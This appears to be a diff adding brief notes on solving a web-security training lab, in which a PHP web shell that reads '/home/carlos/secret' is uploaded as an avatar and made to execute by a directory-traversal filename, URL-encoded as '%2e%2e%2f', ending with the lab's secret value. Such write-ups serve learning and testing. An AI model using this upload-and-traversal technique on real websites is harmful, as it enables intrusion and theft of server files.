@@ -1,0 +1,35 @@
+vulnerable path: /my-account/
+vulnerable function : avatar uploading function
+
+upload the shell script
+
+intercept this request and send it to the repeater 
+
+script: 
+filename: lab_3_shell.php
+->
+<? php echo file_get_contents('/home/carlos/secret'); ?>
+<-
+response -> The file avatars/lab_3_shell.php has been uploaded. <-
+
+when trying to access the file through this path "/files/avatars/lab_3_shell.php"
+it shows nothing 
+
+now let's go to the upload request in the repeater and analyse the request 
+to see if it's vulnerable to directory traversal
+
+in the request if you changed the filename to "../lab_3_shell.php"
+response -> The file avatars/lab_3_shell.php has been uploaded. <-
+that means it's vulnerable to directory traversal
+
+now let's go to /files/avatars/lab_3_shell.php
+the response still nothing
+
+in the request change the filename to "%2e%2e%2flab_3_shell.php"
+response -> the file avatars/../lab_3_shell.php has been uploaded. <-
+
+now let's go to /files/lab_3_shell.php
+
+reflected data: lGfOuZezDNkEGo7jbsmRblBAiBZcTTxS
+
+solved
